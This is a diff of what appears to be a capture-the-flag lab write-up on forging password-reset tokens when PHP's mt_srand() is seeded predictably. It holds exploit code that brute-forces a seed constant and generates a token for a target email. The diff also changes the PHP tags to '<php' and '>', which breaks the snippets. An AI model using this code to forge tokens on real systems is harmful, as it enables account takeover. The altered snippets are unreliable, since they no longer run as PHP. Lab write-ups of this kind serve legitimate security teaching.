@@ -13,7 +13,7 @@ If token generation uses `mt_srand()` with a predictable seed, one known token c
 ## Recover Constant
 
 ```php
-<?php
+<php
 function calculate_seed_value($email, $constant_value) {
     $email_length = strlen($email);
     $email_hex = hexdec(substr($email, 0, 8));
@@ -30,13 +30,13 @@ for ($c = 0; $c <= 1000000; $c++) {
         break;
     }
 }
-?>
+>
 ```
 
 ## Generate Token
 
 ```php
-<?php
+<php
 function calculate_seed_value($email, $constant_value) {
     $email_length = strlen($email);
     $email_hex = hexdec(substr($email, 0, 8));
@@ -46,7 +46,7 @@ function calculate_seed_value($email, $constant_value) {
 $email = "hello@fake.thm";
 mt_srand(calculate_seed_value($email, 99999));
 echo base64_encode(mt_rand()) . "\n";
-?>
+>
 ```
 
 ## Defensive Note
